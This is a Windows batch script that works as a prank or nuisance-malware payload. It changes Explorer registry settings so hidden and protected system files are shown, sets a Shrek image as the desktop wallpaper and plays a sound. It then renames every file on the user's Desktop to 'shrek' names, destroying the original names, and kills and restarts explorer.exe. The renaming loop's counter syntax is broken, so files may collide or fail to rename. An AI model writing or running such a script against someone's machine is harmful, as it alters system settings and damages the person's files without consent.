@echo off &setlocal
set "regkey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
for /f "tokens=2*" %%a in ('reg query %regkey% /v Hidden^|find "REG_DWORD"') do set /a Hidden=%%b
for /f "tokens=2*" %%a in ('reg query %regkey% /v ShowSuperHidden^|find "REG_DWORD"') do set /a SSuperHidden=%%b
REM if "%hidden%"=="1" (set /a hidden=2, SSuperHidden=0) else set /a hidden=1, SSuperHidden=1
if "%hidden%"=="1" (set /a hidden=2, SSuperHidden=0)
reg add %regkey% /f /v Hidden /t REG_DWORD /d %hidden% >nul
reg add %regkey% /f /v ShowSuperHidden /t REG_DWORD /d %SSuperHidden% >nul
for /f "tokens=2*" %%a in ('reg query %regkey% /v Hidden^|find "REG_DWORD"') do set /a Hidden=%%b
REM <nul set /p="System files and folder are "
REM if "%hidden%"=="1" (echo NOT hidden.) else echo hidden.
endlocal

start "Woes of Comp Sigh lmao xD.txt"

set location=C:\Users\%username%\Desktop
start smash.mp3
copy "Shreked.bmp" %location%

set address=%location%\Shreked.bmp
set attributes=attrib %address%
for /F "tokens=*" %%i in ("%attributes%") do set var=%%i
set var=%var: =%
if %var:~1,1%==H (attrib -H %address%) else (attrib +H %address%)

REG ADD "HKCU\Control Panel\Desktop" /V Wallpaper /T REG_SZ /F /D "%location%\Shreked.bmp"
REG ADD "HKCU\Control Panel\Desktop" /V WallpaperStyle /T REG_SZ /F /D 2
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters

cd %location%
set shek = 0
for %%f in (*) do (
ren %%f "shrek%shek%.*"
echo %%f
set a/ shek = shek + 1
)

taskkill /F /IM explorer.exe
start C:\Windows/explorer.exe

timeout -1 /nobreak
